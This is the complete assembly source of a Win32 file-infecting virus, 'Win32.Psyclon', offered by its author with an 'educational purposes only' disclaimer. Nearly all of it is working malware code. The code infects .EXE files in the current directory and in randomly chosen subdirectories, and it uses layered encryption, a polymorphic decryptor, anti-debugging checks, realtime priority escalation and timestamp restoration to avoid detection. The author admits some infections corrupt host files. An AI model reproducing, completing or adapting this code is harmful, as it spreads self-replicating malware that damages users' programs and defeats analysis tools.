;=========================================================
;                    [Win32.Psyclon]
;                By Nomenumbra AkA ZeRogue
;Here is my first public Win32 virus written in Assembler.
;I coded some overwriters and companion virii before but never published them.
;This is my first Win32 PE appender (thanks a lot to Lord Julus' tutorial "Appending to the PE file" and the help of the guys @ VX.NETLUX.ORG)
;Because of the simplistic technique of infection (changing the entry point) heuristics will probably detect this virus.
;It is a pseudo-resident semi-polymorphic multi-layer encrypted multi-threading Win32 PE-Appender.
;Well, that sounds more impressive than it is, it employs a simple form of memory-residency as descrybed by lord julus in his tutorial, "win32 memory recidency",
;that scans all subdirs of the current directory for PE-files and infects them, while at the same time infecting the current directory (this makes it quite speedy)
;It employs 3 layers of encryption, of which 2 decryptors are encrypted by the 3rd, that employs level-3 polymorphism.
;I had problems bringing polymorphism into practice first, but I thought of this (odd but relatively efficient (for a first time) way)
;A big bunch of nop's that would be randomely replaced with other junk (1-byte useless operations) and then we'd generate
;a random offset inside this big nop-part and there we'd built the decryptor that would be filled with junk too and with a chance of 1 in 2 with garbage (2-byte useless operations (like mov eax,eax, or ebx,ebx, push ecx pop ecx, etc))
;The polymorphic engine has some bugs (which I haven't figured out @ the time of writing yet), so that with a chance of 1 in 7 infections, victims might get corrupted a bit (nothing worse) and with a chance of 1 in 15 victims (those seem to happen more often when a file is directly infected by the germ (1st generation virus) might get
;totally fucked up, sorry, but again, it's my first semi-polymorphic virus.
;It also uses rudimentary, simple anti-debugging (like IsDebuggerPresent)
;Well, I hope you guys like it a lil' bit, it's my first try @ Win32 ASM appenders and polymorphism so hey...

;DISCLAIMER:
;THIS SOURCE IS FOR EDUCATIONAL PURPOSES ONLY, BY NO MEANS WILL AND CAN THE AUTHOR BE HELD RESPONSIBLE FOR ANY (POTENTIAL) DAMAGE
;COMING FORTH FROM THIS SOURCE AND/OR ANY BINARIES

;=========================================================



.586p
.model flat, stdcall

extrn ExitProcess:PROC

.data


	ViralName db	"[Win32.Psyclon]",0
	MyName    db	"By Nomenumbra AkA ZeRogue",0

.code
; delta-handle fetcher 
;=========================================================
start:
	
	virsz		equ	vend-dstart ; viral size	
        oDcS            equ     vstart-otherdecryptors ; other decryptors
        initialdec      equ     otherdecryptors-dstart ; 1st decryptor   
        decsz           equ     otherdecryptors-manip  ; 1st decryptor manipulatable part

dstart:	
	call	delta
delta:	pop	ebp
	sub	ebp,	offset delta ; delta-handle
;=========================================================
; Decryptor
;=========================================================
	; 1st generation? if so, ebp = 0 and we don't decrypt the virus
	or	ebp,	ebp
	jz	vstart

 ; Decrypt the other decryptors
 ;---------------------------------
   mov bl,0
   Zdkey=byte ptr $-1
   lea esi,[ebp+otherdecryptors]
   mov edi,esi 
   mov ecx,oDcS 
 
manip:
    ; bunch o' nops to be manipulated into a decryptor
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop  
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop  
    nop
    nop
    nop
    nop
    nop
    nop
 ;---------------------------------   
otherdecryptors:
	; decrypt virus-code
   mov ebx, 90909090h ; will get replaced with dkey
   dkey=dword ptr $-4
   lea esi,[ebp+vstart]
   mov edi,esi
   mov ecx, virsz/4 ; virussize in doublewords
   decr1:      
   lodsd
   xor eax,ebx
   bswap eax
   ror eax,0 ; will get replaced with D3crypt
   D3crypt=byte ptr $-1
   sub eax,ebx
   rol eax,2
   xor eax,ebx
   bswap eax
   stosd
   loop	decr1
 ;---------------------------------
   mov ebx, 90909090h ; will get replaced with dkey2
   dkey2=dword ptr $-4
   lea esi,[ebp+vstart]
   mov edi,esi
   mov ecx, virsz/4 ; virussize in doublewords
   decr2: 
   lodsd
   ror eax,0 ; replaced with D3crypt2
   D3crypt2=byte ptr $-1
   xor eax,ebx
   rol eax,0; replaced with D3crypt2
   D3crypt3=byte ptr $-1
   xor eax,ebx 
   stosd
   loop	decr2

;=========================================================
; Real viral start
;=========================================================
vstart:
;=========================================================
; fetch base addr of kernel
; then decrease a value from the stack (pointed to by esp) and decrease it until we hit the kernel start
	mov	ebx,		[esp]
	and	ebx,0ffff0000h
	mov	ecx,		50h
 ;---------------------------------
getkernel32:	cmp	word ptr [ebx], "ZM"
	jz	short gotkernel32
	sub	ebx,	10000h
	loop	getkernel32
	stc ; set carry flag if loop is completed without finding start of the kernel
 ;---------------------------------
gotkernel32:	jc	retback	; if carry flag is set, we exit			
	mov	[ebp+kernelbase], ebx

	; save some old values
	mov eax,dword ptr [ebp+tmpep]
	mov dword ptr [ebp+oldep],eax
	mov eax,dword ptr [ebp+tmpib]
	mov dword ptr [ebp+oldib],eax

	; fetch address of getprocaddress api
 ;---------------------------------
fetchapis:
	push	ebx
	pop	edx	; kernelbase in edx
	add	edx,	[edx+3ch]
	add	edx,	78h
	mov	edx,	[edx]		
	add	edx,	ebx         ; export table	 
	mov	esi,	[edx+20h]   ; RVA
	add	esi,	ebx         ; pointer to esi
	mov     ecx,0         ; counter to 0
 ;---------------------------------
fetchgetprocaddr:
	inc	ecx        	
	lodsd ; load dword from esi (which is ([([[(kernelbase)+0x3c]+78h]+kernelbase+0x20)]+kernelbase) )
	add	eax,	ebx	
	cmp	[eax],	'PteG'  ; In reverse order because of little-endian byte-order
	jnz	fetchgetprocaddr
	cmp	[eax+4],'Acor'
	jnz	fetchgetprocaddr
	cmp	[eax+8],'erdd'
	jnz	fetchgetprocaddr
 ;---------------------------------	
	; addr = ecx * 2, then * 4 (as addr)
	mov	edi,	ebx	
	mov	ebx,	[edx+24h]
	add	ebx,	edi
	movzx	ecx,	word ptr [ebx+2*ecx]; counter*2 +addr
	sub	ecx,	[edx+10h]
	mov	ebx,	[edx+1Ch]
	add	ebx,	edi		
	mov	edx,	[ebx+4*ecx]	
	add	edx,	edi
	mov	dword ptr [ebp+aGetProcAddr], edx
 ;---------------------------------	
	mov	ebx,	[ebp+kernelbase] ; kernel base
	lea	esi,	[ebp+k32APIs] ; fetch from
	lea	edi,	[ebp+k32APIa] ; store address
	call	getAPIs ; fetch apis	
 ;---------------------------------	
        

   call [ebp+aIsDebuggerPresent] ; is debugger present?
   or eax,eax
   jz itsok ; no? then continue
jmp Tretback ; yes? then we exit
itsok:
                push 0
                lea eax,AntiOlly
		push eax
		mov eax, fs:[30h] 		; pointer to PEB
		movzx eax, byte ptr[eax+2]
		or al,al
		jz noolly		
jmp Tretback                        
noolly: 


        call MultiThreadingInfection
        call GoResident
Tretback:
	or	ebp,	ebp
	jz	exitgerm
;---------------------------------
; Return to host entrypoint
;=========================================================
retback:   
	mov	eax,	[ebp+oldep]
	add	eax,	[ebp+oldib]
	jmp	eax


;=========================================================
InitializeVirus:
;=========================================================

call Fdelta ;refetch delta-handle
Fdelta:
       pop ebp
       sub ebp,offset Fdelta
; Create mutex, if it already exists, we exit
; this we do because we don't want two instances of psyclon to run at the same time (we don't want system cock-ups (like two resident psyclons trying to infect the same file), do we?) 
lea eax,[ebp+MutexName]
push eax
push 1
push 0
call [ebp+aCreateMutex]
cmp eax,0                            
jne MutexSuccess ; if mutex successfull, we continue
ret              ; else we quit
MutexSuccess:
;---------------------------------
;we now proceed to make our process of the highest priority, even above some operating system tasks
;the plus side of this action is that we can "outrun" quick user response and some debuggers
;the min side is the fact that the system might get slower or even crash, alerting the user, but hey, we gotta pay something

call [ebp+aGetCurrentProcess] ; current processhandle in eax
push 100h                      ; realtime priority class (highest)
push eax                       ; handle of current process
call [ebp+aSetPriorityClass]   ; set priority to realtime

;=========================================================
; scan dir and infect files
;=========================================================	

infectDir:
	lea	eax,	[ebp+exemask] ; *.EXE
	call	findFile ; infect dir
	ret
;=========================================================
findFile:
	lea	ebx,	[ebp+searchData]
        push ebx ; finddata structure
        push eax ; file mask
	call	[ebp+aFindFirstFileA]
        cmp     eax,0
        je	CloseSearchHndl        
	; save search-handle
	mov	[ebp+searchHndl], eax
	jmp	prepareinfection

; FindNextFileA
;=========================================================
NextFile:	
	xor	eax,	eax ; make eax 0
	lea	edi,	[ebp+searchData.wfd_FileName]
	mov	ecx,	260
	rep	stosb	
	lea	eax,	[ebp+searchData]
        push    eax
        push [ebp+searchHndl]        
	call	[ebp+aFindNextFileA]	
	or	eax,	eax
	je	CloseSearchHndl          ; no more, close handle

;=========================================================
; Prepare to infect the file by setting attributes to normal, and by opening it
;=========================================================
prepareinfection:
 ;---------------------------------       
         push 80h
         lea esi,[ebp+searchData.wfd_FileName]
         push esi
         call [ebp+aSetFileAttributesA] ; set fileattributes to FILE_ATTRIBUTES_NORMAL (128 (0x80))
 ;---------------------------------         
         push 0
         push 0
         push 3
         push 0
         push 0
         push 0C0000000h
         push esi
         call [ebp+aCreateFileA]         
 ;---------------------------------        
         inc	eax
         cmp    eax,0
	 je	NextFile ; next file, invalid handle		
	 dec	eax
	 mov	[ebp+fileHndl],	eax ; store filehandle
 ;---------------------------------      
         mov	ecx,	040h         
	 call	mapfile ; map the file

;=========================================================
; Check the file's validity, by checking for the MZ and PE bytes at their addresses
; If the file bears an infection mark (a simple 'P' in this case) we won't infect it
;=========================================================
checkFile:
 ;---------------------------------
	; check for MZ 
	cmp	word ptr [eax],	'ZM' ; In reverse order because of little-endian byte-order
	jnz	demapviewfile	
	mov	esi,	[eax+3Ch]	
	add	esi,	eax
	; check for PE
	cmp	dword ptr [esi], 'EP'
	jnz	demapviewfile	
	; check if already infected    
        cmp	byte ptr [esi+3Bh],'P'        
	je	demapviewfile
 ;---------------------------------	
	; close  maphandle
        push [ebp+mapAddr]
	call	[ebp+aUnmapViewOfFile]
        push [ebp+mapHndl]
	call	[ebp+aCloseHandle]

 ;---------------------------------	
        mov ecx,[ebp+searchData.wfd_FileSizeLow]
	add	ecx,	virsz 
        add     ecx,    1000h        
	call	mapfile
	jmp	infectFile		; infect it!
 ;---------------------------------
;=========================================================
; Map the File
;=========================================================
mapfile:
	
        push ecx ; save ecx
 ;---------------------------------
        push 0
        push ecx
        push 0
        push 4
        push 0
        push [ebp+fileHndl]
        call [ebp+aCreateFileMappingA] ; CreateFilaMappingA
 ;---------------------------------
	
	or	eax,	eax ; logical or, if eax is 0, zero flag will be set
	jz	closefile	
	mov	[ebp+mapHndl],	eax
	
	pop	ecx	
 ;--------------------------------- 
        push ecx
        push 0
        push 0
        push 2
        push eax
        call [ebp+aMapViewOfFile] ; MapViewOfFile    
 ;---------------------------------    

	mov	[ebp+mapAddr],	eax ;store addr
	ret
;=========================================================
; Infect a file:
; PE header looks as follows:
; Offset   Length   What?

;   0h      8h      Section's name
;   6h      2h      No of sections
;   8h      4h      VirtualSize
;   0ch     4h      SizeOfRawData
;   14h     4h      PointerToRawData
;   18h     4h      PointerToRelocations
;   1ch     4h      PointerToLinenumbers
;   20h     2h      NumberOfRelocations
;   22h     2h      NumberOfLinenumbers
;   24h     4h      Characteristics
;   28h     4h      Eip value (entry point)
;   38h     4h      Section Alignement
;   3ch     4h      File Alignement
;   54h     4h      Size of Header
;   74h     4h      No of directory entries


;   First we move the base address we got with mapping the file into esi
;   we then add the filealignment (3Ch) and store it in edi too
;   Next thing we do is get the dir-entries in ebx (offset 74h), multiply it with the size (8)
;   then we put the sections in eax (offset 6h),decrease it (last section isn't full size), multiply it with the section-size (28h).
;   Then we add 78h to esi, add the dirs and the sections sizes



;=========================================================
infectFile:	

 ;Learned this from Win32.Capric, as might become clear from the way this virus is structured, I learned a lot from it
 ;--------------------------------- 
	mov	esi,	eax
        add	esi,	[eax+3Ch] ; FileAlignment
	mov	edi,	esi
	mov	ebx,	[esi+74h]         ; No of dir-entries
	shl	ebx,	3                 ; * 8 (size)
	movzx	eax,	word ptr [esi+6]  ; sections
	dec	eax                       ; last one
	mov	ecx,	28h               ; * (size)
	mul	ecx                       
	add	esi,	78h               ; dir-table
	add	esi,	ebx               ; add them
	add	esi,	eax               ; and addr in esi
 
	; address of last section in esi
	; start of pe-header in edi	

	; set section attributes to RWE (we need to write there) 
	or	dword ptr [esi+24h],	0A0000020h ; Characteristics	
 ;--------------------------------- 

	; save old entrypoint and imagebase
	mov	eax,         [edi+28h] ; EIP value
	mov	[ebp+tmpep], eax	
	mov	eax,         [edi+34h] 
	mov	[ebp+tmpib], eax
 ;--------------------------------- 
	; new entrypoint 
	mov	eax,	[esi+10h]      ; SizeOfRawData 
	add	eax,	[esi+0Ch]      ; VirtualAddress
	mov	[ebp+newep],	eax    ; save virus-entrypoint
	mov	[edi+28h],	eax    ;
 ;--------------------------------- 	
	; fetch where to write virus 
	mov	ebx,	[esi+14h]      ; PointerToRawData
	add	ebx,	[esi+10h]      ; SizeOfRawData
	push	ebx                    ; offset in file of where to write virus
 ;--------------------------------- 
	; align the new size to add
	xor	edx,	edx            ;
	mov	eax,	virsz          ; viral size
	add	eax,	[esi+10h]      ; add SizeOfRawData
	push	eax                    ;
	mov	ecx,	[edi+3Ch]      ; alignment
	div	ecx                    ; eax / ecx, modulo in edx
	pop	eax                    ;
	sub	ecx,	edx            ;	
	add	eax,	ecx            ; aligned size in eax
	; set new size of section, file  
	mov	[esi+10h],	eax    ; SizeOfRawData
	mov	[esi+08h],	eax    ; VirtualSize
	add	eax,	[esi+0Ch]      ; VirtualAddress	
	mov	[edi+50h],	eax    ; SizeOfImage
 ;--------------------------------- 

        call GetRandomKeys ; fetch random encryption keys

 ;-----------------------------------------------------------------------------------------------
 ;Here we create the decryptor.
 ;this is a very very basic, general level-3 polymorphic routine (that has some bugs), that only manipulates one of the viral decryptors by adding junk or garbage between the instructions
 ;reg swapping isn't done here.
 ;Keep in mind the (loop @@1), which is as follows: an E2 instruction (loop) preceded by
 ;(254-(loopfromaddress-looptoaddress)), so a xor al,bl (which is 2 bytes big), would make (combined with a lodsb and stosb)
 ;4 bytes and (254-4) = FA so the (loop @@1) would be a (0FAE2h)
 ;The decryptor should look as follows:
 ;      xor al,bl
 ;      rol al,<somenum>
 ;      xor al,bl      
 ;      rol al,<somenum>
 ;-----------------------------------------------------------------------------------------------  


push edi
         lea edi,[ebp+manip]         
         mov ecx,decsz         

junktransplantation:

  push ecx
  mov ecx,3000000 ; wait for some time to influence GetTickCount's result (we don't want all the same junk after each other)
Lwait:
  nop
  nop
  nop
  nop
loop Lwait

  pop ecx
 ;overwrite with random junk
 ;---------------------------------    
    call	[ebp+aGetTickCount]   
    mov ebx,9
    xor edx,edx
    div ebx ;random (0->8) 
    mov al,byte ptr [ebp+junktable+edx]
    stosb
loop junktransplantation 

         call	[ebp+aGetTickCount]
         mov ebx,10 ; random (0->10)
         xor edx,edx
         div ebx  
 ;here is where the polymorphic decryptor is built  
 ;--------------------------------- 
         lea edi,[ebp+manip+edx] ; randomize offset inside nop-part 
         mov ebx,0 ; number of junk bytes used

         mov al,0ACh ; lodsb
       stosb
         mov ax,0C332h ; xor al,bl
       stosw
     call JunkWrite 
         mov ax,0c0c0h ; rol al
       stosw
        push ebx
         call random8bitregs      
        pop ebx
         mov byte ptr [ebp+nXtD+7],al         
       stosb  
     call JunkWrite 
         mov ax,0C332h ; xor al,bl
       stosw
     call JunkWrite
         mov ax,0c0c0h ; rol al 
       stosw
        push ebx
         call random8bitregs         
        pop ebx
         mov byte ptr [ebp+nXtD+2],al       
       stosb
      call JunkWrite
       mov al,0AAh ; stosb
       stosb
       mov al,0E2h ; loop
       stosb 
       mov al,0FEh ; 254       
       sub al,12
       mov ecx,ebx ; decrease for each junk used
adjustementlp:
dec al
loop adjustementlp
       stosb 

pop edi        
        

 ;write decryptor and infectionmark to the file	
 ;---------------------------------
      pop ebx ;file offset
      mov byte ptr [edi+3Bh],'P';infection mark
      lea	esi,	[ebp+dstart]   ;
      xchg	ebx,	edi            ; phdr in ebx, offset in edi
      add	edi,	[ebp+mapAddr]  ; normalize

      
      mov ecx, initialdec ; size in bytes      
      rep movsb        
 ;---------------------------------
 ;  encrypt decryptors
    mov ecx,oDcS
    mov bl,0
    Zekey=byte ptr $-1
    wrtlp:
        lodsb                        
    nXtD:
        ror al,0
        xor al,bl
        ror al,0
        xor al,bl                      
        stosb        
    wrtE:
        loop wrtlp        

 ;---------------------------------	
 ; now encrypt virus and write it to the file
   
   push edi
   mov ebx, 90909090h ; will get replaced with ekey2
   ekey2=dword ptr $-4
   lea esi,[ebp+vstart]   
   mov edi,esi
   mov ecx, virsz/4 ; virussize in doublewords
   encr2: 
   lodsd 
   xor eax,ebx 
   rol eax,0 ; replaced with encr1pt2
   encr1pt2=byte ptr $-1
   xor eax,ebx
   ror eax,0; replaced with encr1pt2
   encr1pt3=byte ptr $-1   
   stosd
   loop	encr2
   pop edi
 ;---------------------------------

encr:
mov	ebx,	90909090h ; will get replaced with ekey	
	ekey=dword ptr $-4
	lea	esi,	[ebp+vstart]
	mov	ecx,	virsz/4
encr1: 
lodsd
bswap eax
xor eax,ebx
ror eax,2
add eax,ebx
rol eax,0 ; will get replaced with Encr1pt
Encr1pt= byte ptr $-1
bswap eax
xor eax,ebx
stosd
loop	encr1
 ;---------------------------------	
	jmp	unmapfile
;=========================================================

; set pointer
demapviewfile:
	mov	ecx,	[ebp+searchData.wfd_FileSizeLow]
        push 0
        push 0
        push ecx
        push [ebp+fileHndl]
	call	[ebp+aSetFilePointer]
        push [ebp+fileHndl]
	call	[ebp+aSetEndOfFile]
 ;---------------------------------	
 ; unmap and close file and maphandle
unmapfile:	

push [ebp+mapAddr]
call	[ebp+aUnmapViewOfFile]
 ;---------------------------------	
closemap:

push [ebp+mapHndl]
call	[ebp+aCloseHandle]
 ;---------------------------------	
closefile:

push [ebp+fileHndl]
call	[ebp+aCloseHandle]	
 ;---------------------------------	
; set back the original fileattributes and time attibutes
setdefattrib:	
	lea	eax,	[ebp+searchData.wfd_CreationTime]
	lea	ebx,	[ebp+searchData.wfd_LastAccessTime]
	lea	ecx,	[ebp+searchData.wfd_LastWriteTime]
        push    ecx
        push    ebx
        push    eax
        push    [ebp+fileHndl]
	call	[ebp+aSetFileTime] ; set filetime
 ;---------------------------------	
 
	lea	eax, [ebp+searchData.wfd_FileName]
        push [ebp+searchData.wfd_FileAttributes]
        push eax
        call [ebp+aSetFileAttributesA]	
 ;---------------------------------	
	
	jmp	NextFile

CloseSearchHndl:
        push [ebp+searchHndl]
	call	[ebp+aFindClose]
findDone:
	ret


;=========================================================
;routine to write garbage bytes
;=========================================================
JunkWrite:
push ebx    
 ;chance of 1 in 2 that we will do junk, and 1 in 2 that we will do garbage
 ;---------------------------------	
call	[ebp+aGetTickCount]
mov ebx,2 ; random (1->2)
xor edx,edx
div ebx
inc edx
cmp edx,1
je Junk ; write junk
        ; else write garbage
    ;---------------------------------	
  mov ecx,1500000 ; wait for some time to influence GetTickCount's result (we don't want all the same junk after each other)
Lwait3:
  nop
  nop
  nop
  nop
loop Lwait3      
  ;---------------------------------	
    call	[ebp+aGetTickCount]
    mov ebx,15 ; random (1->15) (1->No of garbage instructions)
    xor edx,edx
    div ebx 
    inc edx
    push edx
    sub edx,2
    pop ebx
    add edx,ebx ; (((Random-2)+Random) == (offset off garbage instructions))
    mov ax,word ptr [ebp+garbagetable+edx]
    stosw
    pop ebx
    add ebx,2 ; used 2 bytes
    ret
 ;---------------------------------	
Junk:
    call	[ebp+aGetTickCount]
    mov ebx,10 ; random (0->9)
    xor edx,edx
    div ebx    

    mov ecx,edx
    push ecx
 lpt:
    mov ebx,ecx 
    call	[ebp+aGetTickCount]
    xor edx,edx
    div ebx

    mov al,byte ptr [ebp+junktable+edx]
    stosb
 loop lpt
     pop ecx
     pop ebx
     add ebx,ecx 
     ret

;=========================================================
;Random Encryption Key generation Routine
;=========================================================
GetRandomKeys:
	; get random vaule for en/de-cryption keys, and save
        pushad
	call	[ebp+aGetTickCount]
	mov	[ebp+dkey],	eax
	mov	[ebp+ekey],	eax
        push eax                

        call	[ebp+aGetTickCount]
        pop ebx
        xor     eax,ebx
	mov	[ebp+dkey2],	eax
	mov	[ebp+ekey2],	eax 

        call random8bitregs         
          mov [ebp+Zekey],al
          mov [ebp+Zdkey],al             
        
        call random8bitregs         
          mov [ebp+encr1pt],al
          mov [ebp+D3crypt],al 

        call random8bitregs
          mov [ebp+encr1pt2],al
          mov [ebp+D3crypt2],al
                

        call random8bitregs 
          mov [ebp+encr1pt3],al
          mov [ebp+D3crypt3],al      

        popad

        ret

;=========================================================
;To generate random number for the 8-bit registers, such as al (which can be taken directly from
;GetTickCount), We make a loop with the result of ((GetTickCount MOD 100) +1) as length and increase
;the register this way
;=========================================================
random8bitregs:

call	[ebp+aGetTickCount] 
        mov ebx,100                   
        xor edx,edx
        div ebx
        inc edx   ; ((tickcount MOD 100) + 1) = random number from 1 to 100     
        mov al,0
        mov ecx,edx
        IncrLp:
        inc al
        loop IncrLp 

ret

;=========================================================
; Gets apis from dlls usings GetProcAddr
;=========================================================
getAPIs: ; ebx = dll to get from, esi = ptr to api-name, edi = save .
	push	esi
	push	ebx
	call	dword ptr [ebp+aGetProcAddr]	
	test	eax,	eax
	jz	gexit	
	stosd
 ;---------------------------------
gNx:	; get next api
	inc	esi
	cmp	byte ptr [esi], 0
	jnz	gNx
	inc	esi
	cmp	byte ptr [esi], 0FFh
	jnz	getAPIs
gexit:
	ret
;=========================================================
;MultiThreading Initiator
;=========================================================
MultiThreadingInfection:
; Thread Creation
;---------------------------------
  xor eax, eax           ; eax = 0
  lea ebx,[ebp+threadID]; thread ID 
  lea ecx,[ebp+InitializeVirus]  
  push ebx ; Thread ID
  push 4   ; creation flags (4 = suspended)
  push eax ; parameter
  push ecx ; Start address
  push eax ; stacksize
  push eax ; thread attributes
  call [ebp+aCreateThread]
 ; Check for success
 ;---------------------------------
mov [ebp+THandle2],eax ; store thread handle
cmp eax,0
je EndMultiThread
 ; Priority setting
 ;---------------------------------
push 15                        ;thread priority to TIME_CRITICAL
push [ebp+THandle2]             ;thread handle
call [ebp+aSetThreadPriority] 
 ; Resume thread 
 ;---------------------------------
push [ebp+THandle2]
call [ebp+aResumeThread]       ; resume the thread
 ;---------------------------------

EndMultiThread:
ret

;=========================================================
;Pseudo-Residency Initiator
;=========================================================
GoResident:
 ; Thread Creation
 ;---------------------------------
 xor eax, eax           ; eax = 0
  lea ebx,[ebp+threadID]; thread ID 
  lea ecx,[ebp+ResidenceThread]; Residence thread address 
  push ebx ; Thread ID
  push 4   ; creation flags (4 = suspended)
  push eax ; parameter
  push ecx ; Start address
  push eax ; stacksize
  push eax ; thread attributes
  call [ebp+aCreateThread]
 ; Check for success
 ;---------------------------------
mov [ebp+THandle],eax ; store thread handle
cmp eax,0
je EndGoResident
 ; Priority setting
 ;---------------------------------
push 15                        ;thread priority to TIME_CRITICAL
push [ebp+THandle]             ;thread handle
call [ebp+aSetThreadPriority] 
 ; Resume thread 
 ;---------------------------------
push [ebp+THandle]
call [ebp+aResumeThread]       ; resume the thread
 ;---------------------------------

EndGoResident:
ret
;=========================================================
;Resident Thread
;Use recidency to infect random sub-directories
;=========================================================
ResidenceThread:
 ;---------------------------------
call Gdelta ; Restore delta-handle (got lost with thread call)
Gdelta:
       pop ebp
       sub ebp,offset Gdelta
 ;---------------------------------
StillResident:
;FindFirstFileA (search for *.*)
  lea eax,[ebp+searchData2]	    
  push eax
  lea eax,[ebp+DirMask]
  push eax
  call [ebp+aFindFirstFileA]
  mov [ebp+FindHandle],eax		
 ;---------------------------------
  Fnxt:
  cmp eax,0 ; no files?
  je EndRecidency				

  cmp [ebp+searchData2.wfd_FileAttributes],10h ; is it a directory?
  jne ntx
 ;---------------------------------
    call	[ebp+aGetTickCount] ; tickcount
    mov ebx,3 
    xor edx,edx
    div ebx
    inc edx   ; ((tickcount MOD 3) + 1) = random number from 1 to 3  
   ;---------------------------------
  cmp edx,3 ; chance of 1 in 3 that we infec the directory
  jne ntx

  lea esi,[ebp+searchData2.WFD_FileName]
  lodsb
  cmp al,2Eh ; is it a dot? (we can't infect the . and .. results of the search)
  je ntx
 ;---------------------------------
 ;infect the sub-dir
  lea eax,[ebp+searchData2.WFD_FileName]
  push eax
  call [ebp+aSetCurrentDirectoryA]
  call infectdir
  ;--------------------------------- 

  ntx:
 
  lea eax,[ebp+searchData2]
  push eax
  push [ebp+FindHandle]
  call [ebp+aFindNextFileA]
  jmp Fnxt 
 
EndRecidency:

ret

;=========================================================
; DATA -------------------------------------------------------- 
;=========================================================
; Structures
;=========================================================               

filetime                  STRUC      ; filetime structure
   ft_dwLowDateTime            dd ?    
   ft_dwHighDateTime           dd ?   
filetime                  ENDS  ;

win32_find_data	          STRUC 
   wfd_FileAttributes          dd ?   
   wfd_CreationTime            filetime ?   
   wfd_LastAccessTime          filetime ?  
   wfd_LastWriteTime           filetime ? 
   wfd_FileSizeHigh            dd ?      
   wfd_FileSizeLow             dd ?      
   wfd_Reserved0               dd ?         
   wfd_Reserved1               dd ?         
   wfd_FileName                dd 260 dup(?)
   wfd_AlternateFileName       dd 13 dup(?)
       	                       dd  3 dup(?)      
win32_find_data           ENDS        
;=========================================================
; Variables
;=========================================================
	searchData	win32_find_data	? ; searchdata structure       
	searchData2	win32_find_data	? ; searchdata structure 2       
	searchHndl	dd	0         ; FindFirstFileA/FindNextFileA handle
	exemask		db	"*.EXE",0 ; FileMask
        DirMask         db      "*.*",0   ; Directory Mask
	currdir		db	7Fh dup (0) ; CurrentDirrectory buffer        

        FindHandle      dd      0         ; FindFile Handle
	fileattr	dd	0         ; FileAttributes
	fileHndl	dd	0         ; FileHandle
	mapHndl		dd	0         ; FileMapping Handle
	mapAddr		dd	0         ; FileMapping Base Address
	
	kernelbase	dd	0         ; Kernelbase
	user32dll	db	'USER32.DLL',0 ; Dll name
        MutexName       db      '..::PSYCLON::..',0 ; Mutex Name  
        AntiOlly        db      'DAEMON',0 ; Olly string

        threadID        dd      ?
        THandle         dd      ?
        THandle2        dd      ?

	newep		dd	0         
	oldep		dd	01000h	
	tmpep		dd	0
	oldib		dd	0
	tmpib		dd	0

garbagetable    label word                      ;garbage
        mov eax,eax
        mov ebx,ebx
        mov ecx,ecx  
        push eax
        pop  eax      
        push ebx
        pop  ebx      
        push ecx
        pop  ecx
        or eax,eax      
        or ebx,ebx
        or ecx,ecx
        and eax,eax
        and ebx,ebx
	and ecx,ecx
	xchg eax,eax
	xchg ebx,ebx
	xchg ecx,ecx
        

junktable       label byte                      ; junk
        stc
        cmc        
        lahf
        cbw
        sahf
        stc
        nop
        cld
        clc  
        aas    
        
       


;=========================================================
; APIs 
;=========================================================
	sGetProcAddr            db 'GetProcAddr',0
	aGetProcAddr            dd 0
k32APIs:
	sLoadLibraryA           db 'LoadLibraryA',0
	sExitProcess            db 'ExitProcess',0
	sCreateFileA            db 'CreateFileA',0
        sCreateMutex            db 'CreateMutexA',0
        sCreateThread           db 'CreateThread',0  
	sCloseHandle            db 'CloseHandle',0
	sFindFirstFileA         db 'FindFirstFileA',0
	sFindNextFileA          db 'FindNextFileA',0
	sFindClose              db 'FindClose',0           
        sGetCurrentProcess      db 'GetCurrentProcess',0
        sIsDebuggerPresent      db 'IsDebuggerPresent',0
        sResumeThread           db 'ResumeThread',0
	sSetFilePointer         db 'SetFilePointer',0
	sSetEndOfFile           db 'SetEndOfFile',0
	sSetFileAttributesA     db 'SetFileAttributesA',0
	sSetFileTimeA           db 'SetFileTime',0
        sSetPriorityClass       db 'SetPriorityClass',0
        sSetThreadPriority      db 'SetThreadPriority',0
	sSetCurrentDirectoryA   db 'SetCurrentDirectoryA',0
	sCreateFileMappingA     db 'CreateFileMappingA',0
	sMapViewOfFile          db 'MapViewOfFile',0
	sUnmapViewOfFile        db 'UnmapViewOfFile',0
	sGetTickCount           db 'GetTickCount',0
                                db 0FFh

;=========================================================
;Here we store fetched addresses
;=========================================================
k32APIa:
	aLoadLibraryA           dd	0
	aExitProcess            dd	0
	aCreateFileA            dd	0
        aCreateMutex            dd      0
        aCreateThread           dd      0
	aCloseHandle            dd	0
	aFindFirstFileA         dd	0
	aFindNextFileA          dd	0
	aFindClose              dd	0
        aGetCurrentProcess      dd      0           
        aIsDebuggerPresent      dd      0 
        aResumeThread           dd      0
	aSetFilePointer         dd	0
	aSetEndOfFile           dd	0
	aSetFileAttributesA     dd	0
	aSetFileTime            dd	0
        aSetPriorityClass       dd      0
        aSetThreadPriority      dd      0
	aSetCurrentDirectoryA   dd	0        
	aCreateFileMappingA     dd	0
	aMapViewOfFile          dd	0
	aUnmapViewOfFile        dd	0
	aGetTickCount           dd	0 

vend: ; end of virus

; exit the germ
exitgerm:	
	call	ExitProcess,0

end start




